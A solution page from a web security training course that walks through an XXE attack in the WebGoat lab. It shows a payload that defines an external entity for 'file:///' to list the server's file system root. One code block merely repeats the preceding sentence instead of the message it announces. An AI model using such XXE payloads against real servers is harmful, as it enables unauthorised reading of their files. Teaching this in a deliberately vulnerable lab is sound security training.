---
title: "A5:2021 | Security Misconfiguration (5) | Cycubix Docs"
layout: default
nav_order: 5
parent: "A5:2021 | Security Misconfiguration | Cycubix Docs"
grand_parent: "WebGoat Labs | Web Application Security Essentials | Cycubix Docs"
---
# A5:2021 | Security Misconfiguration (5) | Cycubix Docs

**Assignment solution**

The goal of the exercise is to list the root of the file system. If we first try a normal post we see the following request:

```
POST /WebGoat/xxe/simple
Content-Type: application/xml

<?xml version="1.0"?><comment><text>This is my first comment, nice picture</text></comment>
```

The web page is making a xhr request to post a xml message, after that the comment is displayed in the comment section. Now let’s try change the request a bit as shown in the previous section:

```
POST /WebGoat/xxe/simple
Content-Type: application/xml

<?xml version="1.0" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>
```

So instead of including a specific file we make a reference to the root of the filesystem with [`file:///`](file:///). If we just copy and paste this in the comment text box you will get an error in the response body

```
{
  "lessonCompleted" : false,
  "feedback" : "Sorry the solution is not correct, please try again.",
  "output" : "...javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,44]\\nMessage: The processing instruction target matching \\\"[xX][mM][lL]\\\" is not allowed.]"
  "assignment" : "SimpleXXE",
  "attemptWasMade" : true
}
```

This is due to the fact that the JavaScript is taking the input and creates the following message:

```
This is due to the fact that the JavaScript is taking the input and creates the following message:
```

Line 7 contains the input entered in text box if we would use the comment form.

To solve the lesson you have to intercept the complete outgoing request and replace the complete body with the solution. See our lessons about intercepting HTTP traffic.
